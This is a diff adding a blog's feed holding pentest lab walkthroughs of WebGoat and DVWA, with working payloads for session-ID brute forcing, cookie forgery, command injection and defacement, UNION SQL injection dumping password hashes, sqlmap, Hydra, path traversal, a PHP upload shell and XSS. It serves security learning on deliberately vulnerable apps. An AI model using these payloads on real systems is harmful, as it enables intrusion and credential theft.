+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Referer': 'http://localhost:8080/WebGoat/attack?Screen=72&amp;menu=1800',
+    'Cookie': 'JSESSIONID=C22137013C4AA4A8D3D0FA4FB003DC37; __utma=111872281.104604641.1404757910.1408742568.1409390732.25; __utmz=111872281.1404757910.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);WEAKID=%s' % weakid,
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-length': '67',
+    'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='
+    }
+
+payload = {'Username': 'goat',
+'Password': 'goat',
+'WEAKID': weakid,
+'SUBMIT': 'Login'} 
+
+req = requests.post(url, data=payload, headers=hdrs)
+response = req.text
+if 'Congratulations' in response:
+    print response
+    print weakid
+</code></pre>
+
+<p>```</p>
+
+<p>The weak ID discovered by this script was 10208-1409601346610. I refreshed the page, and the lesson was complete.</p>
+
+<p><strong>Spoof an Authentication Cookie</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+Many applications will automatically log a user into their site if the right authentication cookie is specified.   Some times the cookie values can be guessed if the algorithm for generating the cookie can be obtained.  Some times the cookies are left on the client machine and can be stolen by exploiting another system vulnerability.  Some times the cookies may be intercepted using Cross site scripting.  This lesson tries to make the student aware of authentication cookies and presents the student with a way to defeat the cookie authentication method in this lesson.</p>
+
+<p><strong>General Goal(s):</strong>
+The user should be able to bypass the authentication check. Login using the webgoat/webgoat account to see what happens. You may also try aspect/aspect. When you understand the authentication cookie, try changing your identity to alice.</p>
+
+<p>Logging in as webgoat, I see the following:</p>
+
+<p>*Your identity has been remembered</p>
+
+<p>Welcome, webgoat</p>
+
+<p>You have been authenticated with PARAMETERS</p>
+
+<p>And I now have an AuthCookie with the value 65432ubphcfx. If I log in as aspect, the value of the cookie is 65432udfqtb. So the differing bits are:</p>
+
+<p>webgoat: <strong>ubphcfx</strong></p>
+
+<p>aspect: <strong>udfqtb</strong></p>
+
+<p>The first thing to notice is the value length corresponds to the length of the username. When trying to make further sense of it, you notice a pattern:</p>
+
+<ul>
+<li><p>The letters in the username are reversed</p></li>
+<li><p>Each letter is replaced with the next letter in the alphabet</p></li>
+</ul>
+
+
+<p>And the example for aspect:</p>
+
+<p><code>plain
+a -&gt; b
+s -&gt; tb
+p -&gt; qtb
+e -&gt; fqtb
+c -&gt; dfqtb
+t -&gt; udfqtb
+</code></p>
+
+<p>So now we know how to craft a valid cookie for alice:</p>
+
+<p><code>plain
+a -&gt; b
+l -&gt; mb
+i -&gt; jmb
+c -&gt; djmb
+e -&gt; fdjmb
+</code></p>
+
+<p>All that&rsquo;s left is to login as alice, intercept the request and add the correct value for the cookie: 65432fdjmb. We now see this:</p>
+
+<p>Welcome, alice</p>
+
+<p>You have been authenticated with COOKIE</p>
+
+<p><strong>Session Fixation</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+How to steal a session with a &lsquo;Session Fixation&rsquo;</p>
+
+<p><strong>How the attack works:</strong>
+A user is recognized by the server by an unique Session ID. If a user has logged in and is authorized he does not have to reauthorize when he revisits the application as the user is recognized by the Session ID. In some applications it is possible to deliver the Session ID in the Get-Request. Here is where the attack starts.</p>
+
+<p>An attacker can send a hyperlink to a victim with a chosen Session ID. This can be done for example by a prepared mail which looks like an official mail from the application administrator. If the victim clicks on the link and logs in he is authorized by the Session ID the attacker has chosen. The attacker can visit the page with the same ID and is recognized as the victim and gets logged in without authorization.</p>
+
+<p><strong>General Goal(s):</strong>
+This lesson has several stages. You play the attacker but also the victim. After having done this lesson it should be understood how a Session Fixation in general works. It should be also understood that it is a bad idea to use the Get-Request for Session IDs.</p>
+
+<p><img class="center" src="/images/webgoat/session_fixation.png" title="&lsquo;session fixation&rsquo; &lsquo;session fixation&rsquo;" ></p>
+
+<p>For this, I added the SID inside the link in the mail body:</p>
+
+<p><code>html
+&lt;a href=/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=0123456&gt; Goat Hills Financial&lt;/a&gt;
+</code></p>
+
+<p><img class="center" src="/images/webgoat/session_fixation2.png" title="&lsquo;session fixation stage 2&rsquo; &lsquo;session fixation stage 2&rsquo;" ></p>
+
+<p>Just click on the link for this stage.</p>
+
+<p><strong>STAGE 3:</strong> The bank has asked you to verify your data. Log in to see if your details are correct. Your user name is Jane and your password is tarzan.</p>
+
+<p>Just log in for this one.</p>
+
+<p><strong>STAGE 4:</strong> It is time to steal the session now. Use following link to reach Goat Hills Financial.</p>
+
+<p>You are: Hacker Joe</p>
+
+<p>Jane has logged into her account. Go and grab her session! Use Following link to reach the login screen of the bank:</p>
+
+<p><a href="http://localhost:8080/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=NOVALIDSESSION">http://localhost:8080/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=NOVALIDSESSION</a></p>
+
+<p>On the login URL, replace the invalid SID with the one you used previously. You will now see Jane&rsquo;s details.</p>
+
+<h3>Web Services</h3>
+
+<p><strong>Create a SOAP Request</strong></p>
+
+<p><img class="center" src="/images/webgoat/soap.png" title="&lsquo;soap&rsquo; &lsquo;soap&rsquo;" ></p>
+
+<p>The answer is 4. Look for the operations under the <code>&lt;wsdl:portType name=&ldquo;SoapRequest&rdquo;></code> tag.</p>
+
+<p><strong>Stage 2</strong> Now, what is the type of the (id) parameter in the &ldquo;getFirstNameRequest&rdquo; method: the answer is int. Chech for it here:</p>
+
+<p><code>xml
+&lt;wsdl:message name="getFirstNameRequest"&gt;
+&lt;wsdl:part name="id" type="xsd:int"/&gt;
+</code></p>
+
+<p><strong>Stage 3</strong> Intercept the request and invoke any method by sending a valid SOAP request for a valid account.</p>
+
+<p>You must access at least 2 of the methods to pass the lesson.</p>
+
+<p>For this I used SoapUI. Start a new project and give it the wsdl URL:</p>
+
+<p><img class="center" src="/images/webgoat/soapui.png" title="&lsquo;soapui&rsquo; &lsquo;soapui&rsquo;" ></p>
+
+<p>You will see the available operations under the project. Select one of them and copy the request that you will use in the proxy.</p>
+
+<p><img class="center" src="/images/webgoat/soapui2.png" title="&lsquo;soapui2&rsquo; &lsquo;soapui2&rsquo;" ></p>
+
+<p>Replace the question mark with some value:</p>
+
+<p><code>plain
+&lt;id xsi:type="xsd:int"&gt;101&lt;/id&gt;
+</code></p>
+
+<p>Add the basic authentication credentials, then submit the request, and you will see the response in the right tab. The retrieved first name is Joe.</p>
+
+<p><img class="center" src="/images/webgoat/soapui3.png" title="&lsquo;soapui3&rsquo; &lsquo;soapui3&rsquo;" ></p>
+
+<p>Repeat for the other methods. My second choice was the credit card number, and for id 101 it was 987654321.</p>
+
+<p><strong>WSDL Scanning</strong></p>
+
+<p><img class="center" src="/images/webgoat/wsdl.png" title="&lsquo;wsdl scanning&rsquo; &lsquo;wsdl scanning&rsquo;" ></p>
+
+<p>The objective here is to obtain some credit card numbers. Let&rsquo;s look again at the WSDL file:</p>
+
+<p><code>xml
+&lt;wsdl:operation name="getCreditCard" parameterOrder="id"&gt;
+</code></p>
+
+<p>We have a method for retrieving credit cards. All that&rsquo;s left is to, uhm, use it in your favorite proxy: <code>id=101&amp;field=getCreditCard&amp;SUBMIT=Submit</code>.</p>
+
+<p><strong>Web Service SAX Injection</strong></p>
+
+<p><img class="center" src="/images/webgoat/sax_inject.png" title="&lsquo;sax injection&rsquo; &lsquo;sax injection&rsquo;" ></p>
+
+<p>The XML displayed on the page controls the password change. The solution was to add some XML for a user with another id than 101, by intercepting the request and adding the XML data in the password field:</p>
+
+<p><code>xml
+&lt;wsns1:changePassword&gt;
+&lt;id xsi:type='xsd:int'&gt;102&lt;/id&gt;
+&lt;password xsi:type='xsd:string'&gt;102&lt;/password&gt;
+ &lt;/wsns1:changePassword&gt;
+</code></p>
+
+<p><strong>Web Service SQL Injection</strong></p>
+
+<p><img class="center" src="/images/webgoat/wsdl_sqli.png" title="&lsquo;wsdl sqli&rsquo; &lsquo;wsdl sqli&rsquo;" ></p>
+
+<p>Again, SoapUI comes to the rescue:</p>
+
+<p><img class="center" src="/images/webgoat/soap_sqli.png" title="&lsquo;soap sqli&rsquo; &lsquo;soap sqli&rsquo;" ></p>
+
+<h3>Challenge</h3>
+
+<p><strong>The CHALLENGE!</strong></p>
+
+<p>Your mission is to break the authentication scheme, steal all the credit cards from the database, and then deface the website. You will have to use many of the techniques you have learned in the other lessons. The main webpage to deface for this site is &lsquo;webgoat_challenge_guest.jsp&rsquo;</p>
+
+<p>This lesson doesn&rsquo;t have the option to show the Java code. But from earlier lessons, we know how the Show Java button works:</p>
+
+<p><code>html
+onclick="makeWindow(this.href+ '?source=true', 'Java Source')
+</code></p>
+
+<p>So, we need to go to this URL <code><a href="http://localhost:8080/WebGoat/source?source=true">http://localhost:8080/WebGoat/source?source=true</a></code> from the lesson page. By looking around in the challenge code, we can see these values:</p>
+
+<p><code>java
+private String pass = "goodbye";
+private String user = "youaretheweakestlink";
+</code></p>
+
+<p>We can login now and proceed to the next stage.</p>
+
+<p><img class="center" src="/images/webgoat/challenge_creds.png" title="&lsquo;challenge credit cards&rsquo; &lsquo;challenge credit cards&rsquo;" ></p>
+
+<p>Playing around in WebScarab while sending requests, I noticed this cookie that I haven&rsquo;t observed before: <code>user=&ldquo;eW91YXJldGhld2Vha2VzdGxpbms=&rdquo;;</code>. Decoding the Base64, the value is indeed our username, <em>youaretheweakestlink</em>. So I tried some SQL injection on it, but that seemed to break the credit card solution list. In the end, I thought about encoding the injection, since the data in the cookie was Base64 encoded, and it worked!</p>
+
+<p>The injection string that worked was <code>youaretheweakestlink' or &lsquo;1&rsquo;=&lsquo;1</code>, and the encoded variant was <code>eW91YXJldGhld2Vha2VzdGxpbmsnIG9yICcxJz0nMQ==</code>. It didn&rsquo;t work until I also kept the username part.</p>
+
+<p>The final stage is to deface the site.</p>
+
+<p><img class="center" src="/images/webgoat/deface1.png" title="&lsquo;challenge stage 3&rsquo; &lsquo;challenge stage 3&rsquo;" ></p>
+
+<p><img class="center" src="/images/webgoat/deface2.png" title="&lsquo;challenge stage 3&rsquo; &lsquo;challenge stage 3&rsquo;" ></p>
+
+<p><img class="center" src="/images/webgoat/deface3.png" title="&lsquo;challenge stage 3&rsquo; &lsquo;challenge stage 3&rsquo;" ></p>
+
+<p>To deface the site, we will exploit a remote code execution vulnerability. We know the name of the file we need for defacing, but we don&rsquo;t know where it&rsquo;s located. By clicking the View Network button and intercepting the request, we can see there is a file parameter involved. And we can inject an additional command: <code>SUBMIT=View+Network&amp;File=tcp;find / -name webgoat_challenge_guest.jsp -print -quit</code>. This will tell find to search for the file starting from the root directory, and quit after the first match, otherwise it would take long. And we can see the results printed on the screen:</p>
+
+<p><img class="center" src="/images/webgoat/deface4.png" title="&lsquo;challenge stage 3&rsquo; &lsquo;challenge stage 3&rsquo;" ></p>
+
+<p>Now that we know where the file is, we can output some text to it to complete the defacement: <code>SUBMIT=View+Network&amp;File=tcp;echo &ldquo;We serve free 0 days!&rdquo; > /root/WebGoat-5.4/tomcat/webapps/WebGoat/webgoat_challenge_guest.jsp</code>.</p>
+
+<p><img class="center" src="/images/webgoat/deface5.png" title="&lsquo;deface&rsquo; &lsquo;deface&rsquo;" ></p>
+
+<p>And, with this, the WebGoat pentest lab is concluded! This was a massive post, and it took me a while. It&rsquo;s been my favorite web application challenge so far, the amount and variety of the exercises was great, and it covered many common vulnerabilities. Can&rsquo;t recommend this enough!</p>
+
+<p>Fortune cookie:</p>
+
+<blockquote><p>You will experience a strong urge to do good; but it will pass.</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Damn Vulnerable Web Application]]></title>
+    <link href="http://chousensha.github.io/blog/2014/08/08/pentest-lab-damn-vulnerable-web-application/"/>
+    <updated>2014-08-08T00:30:24+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/08/08/pentest-lab-damn-vulnerable-web-application</id>
+    <content type="html"><![CDATA[<p>It&rsquo;s time for some web hacking in my pentest lab, so in this post I will go over attacking DVWA.</p>
+
+<!-- more -->
+
+
+<blockquote><p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn
+vulnerable. Its main goals are to be an aid for security professionals to test their
+skills and tools in a legal environment, help web developers better understand the
+processes of securing web applications and aid teachers/students to teach/learn web
+application security in a class room environment.</p></blockquote>
+
+<p>Since it&rsquo;s already installed on Metasploitable, I didn&rsquo;t have to install it. The default credentials for logging in are <em>admin: password</em>.</p>
+
+<p>For this lab I will use the low and medium levels of security and PHPIDS disabled. The high security setting represents the secure implementation that aims to eliminate the vulnerabilities.</p>
+
+<h3>Brute Force</h3>
+
+<p><a href="https://www.owasp.org/index.php/Brute_force_attack"><strong>Overview</strong></a></p>
+
+<blockquote><p>A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined
+values, making requests to a server using those values, and then analyzing the response. For the sake of efficiency, an attacker may
+use a dictionary attack (with or without mutations) or a traditional brute-force attack (with given classes of characters e.g.:
+alphanumerical, special, case (in)sensitive). Considering a given method, number of tries, efficiency of the system which conducts the
+attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take
+to submit all chosen predetermined values.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/bruteforce.png" title="&lsquo;bruteforce&rsquo; &lsquo;bruteforce&rsquo;" ></p>
+
+<p>In the first challenge we have to brute force a login form.</p>
+
+<p>As always, first I used some dummy values to see how is the data transmitted, and it&rsquo;s visible in the URL:</p>
+
+<p><code>plain
+http://metasploitable/dvwa/vulnerabilities/brute/?username=test&amp;password=test&amp;Login=Login#
+</code></p>
+
+<p>I will use Hydra to brute force the form. I created some files with usernames and passwords:</p>
+
+<p>``` plain
+cat users.txt
+admin
+test
+administrator</p>
+
+<p>cat pass.txt
+admin
+1234
+password
+letmein
+test
+password1234
+```</p>
+
+<p>I ran Hydra like this:</p>
+
+<p>``` plain
+hydra 192.168.127.128 -L ~/Desktop/users.txt -P ~/Desktop/pass.txt http-get-form &ldquo;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=798cbe3ff31159e5a08aae5a407f81cf&rdquo;</p>
+
+<p>Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak &ndash; for legal purposes only</p>
+
+<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-08-09 13:05:32
+[DATA] 16 tasks, 1 server, 18 login tries (l:3/p:6), ~1 try per task
+[DATA] attacking service http-get-form on port 80
+[80][www-form] host: 192.168.127.128   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-08-09 13:05:33
+```</p>
+
+<p>And we have cracked it!</p>
+
+<h3>Command Execution</h3>
+
+<p><a href="https://www.owasp.org/index.php/Command_Injection"><strong>Overview</strong></a></p>
+
+<blockquote><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable
+application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers
+etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of
+the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/rce.png" title="&lsquo;code execution&rsquo; &lsquo;remote code execution&rsquo;" ></p>
+
+<p>On this page we can ping an arbitrary IP address. We can run arbitrary code by typing <code>;whoami</code>, which will tell us the server is running as the <em>www-data</em> user. The semicolon is a way to stack commands in Linux, so here we use it to end the previous command (which was the ping functionality), and we insert a new command of our choosing to be run by the vulnerable server.</p>
+
+<p>On medium, the same results can be achieved by entering <code>||whoami</code> instead.</p>
+
+<p>The difference between the operators is that <code>;</code> runs both commands irrespective of the first command&rsquo;s status, whereas <code>||</code> executes the second command only if the previous one failed.</p>
+
+<h3>CSRF</h3>
+
+<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29"><strong>Overview</strong></a></p>
+
+<blockquote><p>CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated.
+With a little help of social engineering (like sending a link via email/chat), an attacker may trick the users of a web application
+into executing actions of the attacker&rsquo;s choosing. A successful CSRF exploit can compromise end user data and operation in case of
+normal user. If the targeted end user is the administrator account, this can compromise the entire web application.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/csrf.png" title="&lsquo;csrf&rsquo; &lsquo;csrf&rsquo;" ></p>
+
+<p>We see here that we can change the admin password. When we submit the new password, we see the request looks like this:</p>
+
+<p><code>plain
+http://metasploitable/dvwa/vulnerabilities/csrf/?password_new=newpass&amp;password_conf=newpass&amp;Change=Change#
+</code></p>
+
+<p>We can exploit this behavior to change anyone&rsquo;s password as long as they are logged in to the application, by tricking the user to perform the request. The exact method may differ, but an example would be to use the image tag to make the request behind the scenes. Of course, this could be achieved by manipulating HTML in other ways too, with a link, iframe, script, etc.</p>
+
+<p><code>plain
+&lt;img src="http://metasploitable/dvwa/vulnerabilities/csrf/?password_new=newpass&amp;password_conf=newpass&amp;Change=Change#"&gt;
+</code></p>
+
+<h3>File Inclusion</h3>
+
+<p><a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Remote_File_Inclusion"><strong>Overview</strong></a></p>
+
+<blockquote><p>The application loads data from an attacker-controlled resource at runtime, enabling a variety of malicious activities. Either the
+source address or the resource itself (or both) may be under the attacker&rsquo;s control.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/include.png" title="&lsquo;file inclusion&rsquo; &lsquo;include file&rsquo;" ></p>
+
+<p>The file inclusion is pretty straightforward:</p>
+
+<p><code>plain
+http://192.168.127.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
+</code></p>
+
+<h3>SQL Injection</h3>
+
+<p><a href="https://www.owasp.org/index.php/SQL_Injection"><strong>Overview</strong></a></p>
+
+<blockquote><p>A SQL injection attack consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application. A
+successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute
+administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file
+system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL
+commands are injected into data-plane input in order to effect the execution of predefined SQL commands.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/sqli.png" title="&lsquo;sqli&rsquo; &lsquo;sqli&rsquo;" ></p>
+
+<p>The vulnerability is straightforward. On low security, injecting <code>&lsquo;or 1=1&mdash; </code> returns all records:</p>
+
+<p>``` plain
+ID: &lsquo;or 1=1&mdash;
+First name: admin
+Surname: admin</p>
+
+<p>ID: &lsquo;or 1=1&mdash;
+First name: Gordon
+Surname: Brown</p>
+
+<p>ID: &lsquo;or 1=1&mdash;
+First name: Hack
+Surname: Me</p>
+
+<p>ID: &lsquo;or 1=1&mdash;
+First name: Pablo
+Surname: Picasso</p>
+
+<p>ID: &lsquo;or 1=1&mdash;
+First name: Bob
+Surname: Smith
+```
+The <em>id</em> parameter is vulnerable, as expected. From here we can proceed in different ways, fingerprinting the host, retrieving more information, etc. I will settle for getting the password hashes for the users we have discovered.</p>
+
+<p><strong>Discover the number of colums</strong></p>
+
+<p><code>&lsquo;union select 1,2&mdash; </code></p>
+
+<p><code>plain
+ID: 'union select 1,2--
+First name: 1
+Surname: 2
+</code></p>
+
+<p><strong>Get database name</strong></p>
+
+<p><code>&lsquo;union select database(),2&mdash; </code></p>
+
+<p><code>plain
+ID: 'union select database(),2--
+First name: dvwa
+Surname: 2
+</code></p>
+
+<p><strong>Get table names for the current database</strong></p>
+
+<p><code>&lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash; </code></p>
+
+<p>``` plain
+ID: &lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash;
+First name: guestbook
+Surname: 2</p>
+
+<p>ID: &lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash;
+First name: users
+Surname: 2
+```</p>
+
+<p><strong>Get column names for the users table</strong></p>
+
+<p><code>&lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;  </code></p>
+
+<p>``` plain
+ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: user_id
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: first_name
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: last_name
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: user
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: password
+Surname: 2</p>
+
+<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
+First name: avatar
+Surname: 2
+```</p>
+
+<p><strong>Get password hashes</strong></p>
+
+<p><code>&lsquo;union select user, password from users&mdash; </code></p>
+
+<p>``` plain
+ID: &lsquo; union select user, password from users&mdash;
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99</p>
+
+<p>ID: &lsquo; union select user, password from users&mdash;
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03</p>
+
+<p>ID: &lsquo; union select user, password from users&mdash;
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</p>
+
+<p>ID: &lsquo; union select user, password from users&mdash;
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</p>
+
+<p>ID: &lsquo; union select user, password from users&mdash;
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+```</p>
+
+<p>On medium security, the injection query only differs in using an integer instead of a quote: <code>99 or 1=1&mdash; </code>.</p>
+
+<h3>SQL Injection (Blind)</h3>
+
+<p><a href="https://www.owasp.org/index.php/Blind_SQL_Injection"><strong>Overview</strong></a></p>
+
+<blockquote><p>Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and
+determines the answer based on the applications response. This attack is often used when the web application is configured to show
+generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</p>
+
+<p>When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the
+SQL Query&rsquo;s syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the
+data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by
+asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not
+impossible.</p></blockquote>
+
+<p>Since this is more or less identical to the previous SQL injection, I will instead use sqlmap against it, so I don&rsquo;t have to repeat the same queries:</p>
+
+<p><code>plain
+sqlmap -u "http://192.168.127.128/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=cd855d2bfb73dfe22ef2f11a475fa9e6" --dbms=MySQL --dump
+</code></p>
+
+<h3>Upload</h3>
+
+<p><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload"><strong>Overview</strong></a></p>
+
+<blockquote><p>Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be
+attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the
+first step.</p>
+
+<p>The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database,
+forwarding attacks to back-end systems, and simple defacement. It depends on what the application does with the uploaded file and
+especially where it is stored.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/upload.png" title="&lsquo;file upload&rsquo; &lsquo;upload&rsquo;" ></p>
+
+<p>I am going to upload a PHP file that runs the command <em>uname -a</em>:</p>
+
+<p>``` php
+&lt;?php</p>
+
+<p>$cmd = system(&lsquo;uname -a&rsquo;);
+echo $cmd;</p>
+
+<p>?>
+```</p>
+
+<p>After uploading the file, the path where we can find it is conveniently provided:</p>
+
+<p><em>../../hackable/uploads/upload.php succesfully uploaded!</em></p>
+
+<p>Navigate to the file to see the command output:</p>
+
+<p><code>plain
+192.168.127.128/dvwa/vulnerabilities/upload/../../hackable/uploads/upload.php
+</code></p>
+
+<p>On medium security, the code checks if the file is a jpeg image and under a certain size:</p>
+
+<p><code>php
+if (($uploaded_type == "image/jpeg") &amp;&amp; ($uploaded_size &lt; 100000))
+</code></p>
+
+<p>However, this can be easily bypassed by intercepting the request and modifying the filename. Here is what I had in Live HTTP Headers:</p>
+
+<p><code>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;upload.php%00.jpg&rdquo;</code></p>
+
+<p>And I modified it to:</p>
+
+<p><code>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;upload.php&rdquo;\r\n</code></p>
+
+<h3>XSS reflected</h3>
+
+<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Reflected_XSS_Attacks"><strong>Overview</strong></a></p>
+
+<blockquote><p>Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or
+any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to
+victims via another route, such as in an e-mail message, or on some other web site. When a user is tricked into clicking on a malicious
+link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web
+site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a &ldquo;trusted&rdquo; server.
+Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/xss_reflected.png" title="&lsquo;reflected xss&rsquo; &lsquo;reflected xss&rsquo;" ></p>
+
+<p>Low security:</p>
+
+<p>``` html</p>
+
+<script>alert(document.cookie)</script>
+
+
+<p>```</p>
+
+<p>Medium security:</p>
+
+<p>``` html</p>
+
+<SCRIPT>alert(document.cookie)</SCRIPT>
+
+
+<p>```</p>
+
+<h3>XSS stored</h3>
+
+<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_XSS_Attacks"><strong>Overview</strong></a></p>
+
+<blockquote><p>Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message
+forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored
+information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.</p></blockquote>
+
+<p><img class="center" src="/images/dvwa/xss_stored.png" title="&lsquo;stored xss&rsquo; &lsquo;stored xss&rsquo;" ></p>
+
+<p>The vulnerable field is the name box. The XSS strings that I used on the reflected XSS page work for this one as well, the only difference is that I had to use Firebug to modify the maximum length from 10 to an arbitrary higher value.</p>
+
+<p>As you can see, DVWA was..damn vulnerable!</p>
+
+<blockquote><p>Cheer Up!  Things are getting worse at a slower rate.</p></blockquote>
+]]></content>
+  </entry>
+  
+</feed>
